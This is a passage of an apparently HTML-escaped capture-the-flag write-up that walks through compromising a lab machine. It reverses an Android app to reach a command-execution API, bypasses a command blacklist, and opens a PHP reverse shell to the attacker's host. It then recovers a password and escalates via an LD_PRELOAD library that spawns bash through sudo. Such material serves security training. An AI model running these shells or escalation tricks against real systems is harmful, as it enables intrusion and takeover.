    &lt;span class="n"&gt;code&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;UUID&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;androidId&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="n"&gt;deviceId&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="n"&gt;SimSerialNumber&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="o"&gt;()).&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;System&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;out&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;println&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="o"&gt;}&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We compile this code with &lt;code&gt;javac&lt;/code&gt; and execute it with &lt;code&gt;java&lt;/code&gt; (yeah I have named
it HelloWorld):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine ~]$ java HelloWorld
00000000-02e7-1fb5-0000-000003daceff
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can now try again the URL with this UUID sent in a post parameter:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine ~]$ curl --data &amp;#39;uuid=00000000-02e7-1fb5-0000-000003daceff&amp;#39; https://192.168.56.101/register/new --insecure
{&amp;quot;registered&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;message&amp;quot;:&amp;quot;The requested UUID is now registered.&amp;quot;,&amp;quot;token&amp;quot;:&amp;quot;t6nsb2SrfYKqsp8JIdbEscwfwA6JEeUh&amp;quot;}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Great we are registered, what's next?&lt;/p&gt;
&lt;h3&gt;Command execution and CommandActivity.java&lt;/h3&gt;
&lt;p&gt;Line 111 in the file &lt;code&gt;CommandActivity.java&lt;/code&gt; we see the doCmd method that seems
to execute commands on the server via HTTP:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="kd"&gt;public&lt;/span&gt; &lt;span class="kt"&gt;void&lt;/span&gt; &lt;span class="nf"&gt;doCmd&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;View&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt; &lt;span class="o"&gt;{&lt;/span&gt;
    &lt;span class="n"&gt;Toast&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;makeText&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Context&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;CharSequence&lt;/span&gt;&lt;span class="o"&gt;)(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;Running command: &amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getTag&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;()),&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;).&lt;/span&gt;&lt;span class="na"&gt;show&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;object&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Base64&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;encodeToString&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="kt"&gt;byte&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getTag&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getBytes&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;int&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;object2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;TelephonyManager&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getBaseContext&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;getSystemService&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;phone&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;String&lt;/span&gt; &lt;span class="n"&gt;string2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getDeviceId&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;object2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSimSerialNumber&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;string2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;UUID&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="n"&gt;Settings&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;Secure&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="n"&gt;ContentResolver&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getContentResolver&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;android_id&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;)).&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="o"&gt;(),&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;string2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="o"&gt;()&lt;/span&gt; &lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="n"&gt;lt&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt; &lt;span class="mi"&gt;32&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="kt"&gt;long&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;hashCode&lt;/span&gt;&lt;span class="o"&gt;()).&lt;/span&gt;&lt;span class="na"&gt;toString&lt;/span&gt;&lt;span class="o"&gt;();&lt;/span&gt;
    &lt;span class="n"&gt;Object&lt;/span&gt; &lt;span class="n"&gt;object3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getSharedPreferences&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="k"&gt;this&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2131099666&lt;/span&gt;&lt;span class="o"&gt;),&lt;/span&gt; &lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;object2&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;object3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;api_server&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="n"&gt;object3&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;object3&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="na"&gt;getString&lt;/span&gt;&lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;api_auth_token&amp;quot;&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="kc"&gt;null&lt;/span&gt;&lt;span class="o"&gt;);&lt;/span&gt;
    &lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;CallAPI&lt;/span&gt;&lt;span class="o"&gt;().&lt;/span&gt;&lt;span class="na"&gt;execute&lt;/span&gt;&lt;span class="o"&gt;((&lt;/span&gt;&lt;span class="n"&gt;Object&lt;/span&gt;&lt;span class="o"&gt;[])&lt;/span&gt;&lt;span class="k"&gt;new&lt;/span&gt; &lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;[]{&lt;/span&gt;&lt;span class="s"&gt;&amp;quot;https://&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object2&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s"&gt;&amp;quot;/do/cmd/&amp;quot;&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="o"&gt;(&lt;/span&gt;&lt;span class="n"&gt;String&lt;/span&gt;&lt;span class="o"&gt;)&lt;/span&gt;&lt;span class="n"&gt;object&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;string2&lt;/span&gt;&lt;span class="o"&gt;,&lt;/span&gt; &lt;span class="n"&gt;object3&lt;/span&gt;&lt;span class="o"&gt;});&lt;/span&gt;
&lt;span class="o"&gt;}&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;The View object in parameter is the command to execute. The command is just
base64 encoded before sending it to the server as &lt;code&gt;object&lt;/code&gt; in the url, the
string2&lt;code&gt;parameter is the UUID we generate a few lines ago sent in the HTTP
header as 'X-UUID'
parameter, the&lt;/code&gt;object3` parameter is the token to authenticate to the API given
with the curl command just before also sent in the header as 'X-Token' (you may
need to look at the CallAPI method and more particulary at line 182 and 183)&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine ~]$ curl   https://192.168.56.101/do/cmd/$(echo -ne id | base64) --header &amp;quot;X-UUID: 00000000-02e7-1fb5-0000-000003daceff&amp;quot; --header &amp;quot;X-Token: n1dJEyZaiFtRyJSoIl2pzI0HDO6BGw18&amp;quot; --insecure
{&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;id&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;uid=998(nginx) gid=997(nginx) groups=997(nginx)\n&amp;quot;}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can execute command on the server, let us wrote a simple bash script to
simplify the next steps (we put an echo at the end to have a nice output):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="ch"&gt;#!/bin/bash&lt;/span&gt;

curl   https://192.168.56.101/do/cmd/&lt;span class="k"&gt;$(&lt;/span&gt;&lt;span class="nb"&gt;echo&lt;/span&gt; -ne &lt;span class="nv"&gt;$1&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; base64&lt;span class="k"&gt;)&lt;/span&gt; --header &lt;span class="s2"&gt;&amp;quot;X-UUID: 00000000-02e7-1fb5-0000-000003daceff&amp;quot;&lt;/span&gt; --header &lt;span class="s2"&gt;&amp;quot;X-Token: n1dJEyZaiFtRyJSoIl2pzI0HDO6BGw18&amp;quot;&lt;/span&gt; --insecure
&lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let us gather some information about the system (there is a blacklist that block
us and forgive us to directly use &lt;code&gt;ls&lt;/code&gt; but the absolute path works):&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[maggick@rootine ~]$ ./p ls
{&amp;quot;status&amp;quot;:&amp;quot;error&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;Command &amp;#39;ls&amp;#39; contains a banned command.&amp;quot;}
[maggick@rootine ~]$ ./p /bin/ls
{&amp;quot;status&amp;quot;:&amp;quot;ok&amp;quot;,&amp;quot;command&amp;quot;:&amp;quot;\/bin\/ls&amp;quot;,&amp;quot;output&amp;quot;:&amp;quot;index.php\ntest.php\n&amp;quot;}
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Shell exploitation&lt;/h2&gt;
&lt;h3&gt;Reverse shell&lt;/h3&gt;
&lt;p&gt;From there we can get an interactive reverse shell. Let us use the php reverse
shell from
&lt;a href="http://pentestmonkey.net/cheat-sheet/shells/reverse-shell-cheat-sheet"&gt;pentestmonkey&lt;/a&gt;:&lt;/p&gt;
&lt;p&gt;We need to listen on our host machine for the server connection:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;nc -v -n -l -p 8080
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Then we need to open the connection from the server:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/bin\/php -r &amp;#39;$sock=fsockopen(\&amp;quot;192.168.56.1\&amp;quot;,8080);exec(\&amp;quot;\/bin\/sh -i &amp;amp;lt;&amp;amp;amp;4 &amp;amp;gt;&amp;amp;amp;4 2&amp;amp;gt;&amp;amp;amp;4\&amp;quot;);&amp;#39;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It works with no more restriction:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sh-4.2$ id
id
uid=998(nginx) gid=997(nginx) groups=997(nginx)
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Batman and Robin?&lt;/h3&gt;
&lt;p&gt;We can get a look at the &lt;code&gt;/etc/passwd&lt;/code&gt; file:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
adm:x:3:4:adm:/var/adm:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/spool/mail:/sbin/nologin
operator:x:11:0:operator:/root:/sbin/nologin
games:x:12:100:games:/usr/games:/sbin/nologin
ftp:x:14:50:FTP User:/var/ftp:/sbin/nologin
nobody:x:99:99:Nobody:/:/sbin/nologin
avahi-autoipd:x:170:170:Avahi IPv4LL Stack:/var/lib/avahi-autoipd:/sbin/nologin
dbus:x:81:81:System message bus:/:/sbin/nologin
polkitd:x:999:998:User for polkitd:/:/sbin/nologin
tss:x:59:59:Account used by the trousers package to sandbox the tcsd daemon:/dev/null:/sbin/nologin
postfix:x:89:89::/var/spool/postfix:/sbin/nologin
sshd:x:74:74:Privilege-separated SSH:/var/empty/sshd:/sbin/nologin
nginx:x:998:997:Nginx web server:/var/lib/nginx:/sbin/nologin
apache:x:48:48:Apache:/usr/share/httpd:/sbin/nologin
robin:x:1000:1000::/home/robin:/bin/bash
bryan:x:1001:1001::/home/bryan:/bin/bash
sean:x:1002:1002::/home/sean:/bin/bash
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We can see in the &lt;code&gt;/etc/passwd&lt;/code&gt; file that there is 3 users: robin, bryan and
sean. Moreover in the &lt;code&gt;CommandActivity.java&lt;/code&gt; file we have seen that there is a
mean to execute ssh command (also the port is not open) using the user robin.
The password used for this command is a simply a XOR between the
&lt;code&gt;integryity_check&lt;/code&gt; base64 encoded string at the beginning of the file and the
string define in the validate method. We can reuse the code from there and find
back the password: 40373df4b7a1f413af61cf7fd06d03a565a51898&lt;/p&gt;
&lt;p&gt;With our reverse shell a simple &lt;code&gt;su robin&lt;/code&gt; and the password above give us a shell
as the robin user:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;id
uid=1000(robin) gid=1000(robin) groups=1000(robin)
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;Where is bryan?&lt;/h3&gt;
&lt;p&gt;For the next part of the challenge we may need a real pty shell, Once more
&lt;a href="http://pentestmonkey.net/blog/post-exploitation-without-a-tty"&gt;pentest monkey&lt;/a&gt;
will help us:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="n"&gt;python&lt;/span&gt; &lt;span class="o"&gt;-&lt;/span&gt;&lt;span class="n"&gt;c&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;import pty; pty.spawn(&amp;quot;/bin/bash&amp;quot;)&amp;#39;&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We go in the user directory (&lt;code&gt;cd&lt;/code&gt;) and we see a file &lt;code&gt;debug.gpg&lt;/code&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;cat debug.gpg
-----BEGIN PGP SIGNED MESSAGE-----
Hash: SHA1

Dude,

I know you are trying to debug this stupid dice thing, so I figured the below
will be useful?

[...]
__libc_start_main(0x555555554878, 1, 0x7fffffffe508, 0x5555555548e0 &amp;amp;lt;unfinished ...&amp;amp;gt;
getenv(&amp;quot;LD_PRELOAD&amp;quot;)                                                                                          = nil
rand()                                                                                                        = 1804289383
__printf_chk(1, 0x555555554978, 0x6b8b4567, 0x7ffff7dd40d4)                                                   = 22
__cxa_finalize(0x555555754e00, 0, 0, 1)                                                                       = 0x7ffff7dd6290
+++ exited (status 0) +++Dice said: 1804289383
[...]

Lemme know!

- --
Sean
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We search for the dice program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;find / -name &amp;#39;dice&amp;#39; 2&amp;amp;gt;/dev/null
/usr/local/bin/dice
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;This program simply roll a dice:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;/usr/local/bin/dice
Dice said: 1804289383
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;An other useful information is that we can roll the dice as bryan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -l
[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898

Matching Defaults entries for robin on this host:
    requiretty, !visiblepw, always_set_home, env_reset, env_keep=&amp;quot;COLORS
    DISPLAY HOSTNAME HISTSIZE INPUTRC KDEDIR LS_COLORS&amp;quot;, env_keep+=&amp;quot;MAIL PS1
    PS2 QTDIR USERNAME LANG LC_ADDRESS LC_CTYPE&amp;quot;, env_keep+=&amp;quot;LC_COLLATE
    LC_IDENTIFICATION LC_MEASUREMENT LC_MESSAGES&amp;quot;, env_keep+=&amp;quot;LC_MONETARY
    LC_NAME LC_NUMERIC LC_PAPER LC_TELEPHONE&amp;quot;, env_keep+=&amp;quot;LC_TIME LC_ALL
    LANGUAGE LINGUAS _XKB_CHARSET XAUTHORITY&amp;quot;, env_keep+=LD_PRELOAD,
    secure_path=/sbin\:/bin\:/usr/sbin\:/usr/bin

User robin may run the following commands on this host:
    (bryan) /usr/local/bin/dice
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let us put all the pieces together. We can run the program as bryan, we now that
the program load the &lt;code&gt;LD_PRELOAD&lt;/code&gt; environement variable.&lt;/p&gt;
&lt;p&gt;A simple google search lead us to
&lt;a href="http://jvns.ca/blog/2014/11/27/ld-preload-is-super-fun-and-easy/"&gt;this article&lt;/a&gt;
and
&lt;a href="https://rafalcieslak.wordpress.com/2013/04/02/dynamic-linker-tricks-using-ld_preload-to-cheat-inject-features-and-investigate-programs/"&gt;this one&lt;/a&gt;.
So now we just need to write a shared library to replace &lt;code&gt;rand()&lt;/code&gt; by &lt;code&gt;/bin/bash&lt;/code&gt;
run the program as bryan and we would get a shell as bryan.&lt;/p&gt;
&lt;p&gt;When testing the trick I ran into the following error:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[robin@fII ~]$ gcc -shared -fPIC unrandom.c -o unrandom.so
gcc: error trying to exec &amp;#39;cc1&amp;#39;: execvp: No such file or directory
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We just need to add some variable to our user's PATH:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;export PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin:/usr/games:/usr/local/game
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;From there we we can compile the shared library and execute the dice program
with it:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[robin@fII ~]$ gcc -shared -fPIC unrandom.c -o unrandom.so
gcc -shared -fPIC unrandom.c -o unrandom.so
[robin@fII ~]$ LD_PRELOAD=$PWD/unrandom.so /usr/local/bin/dice
LD_PRELOAD=$PWD/unrandom.so /usr/local/bin/dice
42 baby
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We need to copy the &lt;code&gt;.so&lt;/code&gt; to a location where bryan could read it like &lt;code&gt;/tmp/&lt;/code&gt;.
Now we can run the program as bryan and load the shared library:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;sudo -u bryan LD_PRELOAD=/tmp/unrandom.so /usr/local/bin/dice
[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898

42 baby!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We need to modify the code to get a shell:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;#include &amp;amp;lt;stdlib.h&amp;amp;gt;

char *getenv(const char *name){
return 0;
}

int rand(){
system(&amp;quot;/bin/bash&amp;quot;);
return 42; //the most random number in the universe
}
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;We compile it with &lt;code&gt;gcc&lt;/code&gt; and run it as bryan:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[robin@fII ~]$ sudo -u bryan LD_PRELOAD=/tmp/lol.so /usr/local/bin/dice
sudo -u bryan LD_PRELOAD=/tmp/lol.so /usr/local/bin/dice
[sudo] password for robin: 40373df4b7a1f413af61cf7fd06d03a565a51898
[bryan@fII robin]$ id
id
uid=1001(bryan) gid=1001(bryan) groups=1001(bryan)
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;sean&lt;/h3&gt;
&lt;p&gt;Now that we have a shell as bryan we may execute the &lt;code&gt;backup&lt;/code&gt; script own by
sean with the SUID set:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[bryan@fII bin]$ ls -al
ls -al
total 1960
drwxr-xr-x.  2 root root       59 Aug 17  2015 .
drwxr-xr-x. 12 root root     4096 Jun 22  2015 ..
-rwsr-x---.  1 sean bryan    8830 Jul  2  2015 backup
-rwxr-xr-x.  1 root root  1107672 Jun 22  2015 composer
-rwx--x--x.  1 root root     8830 Jul  2  2015 dice
-rwsr-x---   1 root sean   866169 Aug 15  2015 restore
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Let us see what it does:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;[bryan@fII bin]$ ./backup
./backup
* Securing environment
* Performing database backup...
app/
app/.gitignore
database.sqlite
framework/
framework/cache/
framework/cache/.gitignore
framework/sessions/
framework/sessions/.gitignore
framework/views/
framework/views/.gitignore
logs/
logs/.gitignore
logs/lumen.log
* Backup done!
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;It might be something about WildCards on linux.  The following
&lt;a href="https://www.defensecode.com/public/DefenseCode_Unix_WildCards_Gone_Wild.txt"&gt;link&lt;/a&gt;
let us learn more about Linux WildCards vulnerability.&lt;/p&gt;
&lt;p&gt;Let us see what is used by the backup program with &lt;code&gt;strace&lt;/code&gt; which available on
the server let us try it to see the inside of the program:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="cp"&gt;[&lt;/span&gt;&lt;span class="nx"&gt;sean&lt;/span&gt;&lt;span class="p"&gt;@&lt;/span&gt;&lt;span class="nx"&gt;fII&lt;/span&gt; &lt;span class="nx"&gt;bin&lt;/span&gt;&lt;span class="cp"&gt;]&lt;/span&gt;&lt;span class="o"&gt;$&lt;/span&gt; &lt;span class="nt"&gt;strace&lt;/span&gt; &lt;span class="nt"&gt;-s&lt;/span&gt; &lt;span class="nt"&gt;999&lt;/span&gt; &lt;span class="nt"&gt;-v&lt;/span&gt; &lt;span class="nt"&gt;-f&lt;/span&gt; &lt;span class="o"&gt;./&lt;/span&gt;&lt;span class="nt"&gt;backup&lt;/span&gt; &lt;span class="nt"&gt;2&lt;/span&gt;&lt;span class="o"&gt;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;gt&lt;/span&gt;&lt;span class="o"&gt;;&amp;amp;&lt;/span&gt;&lt;span class="nt"&gt;amp&lt;/span&gt;&lt;span class="o"&gt;;&lt;/span&gt;&lt;span class="nt"&gt;1&lt;/span&gt; &lt;span class="o"&gt;|&lt;/span&gt; &lt;span 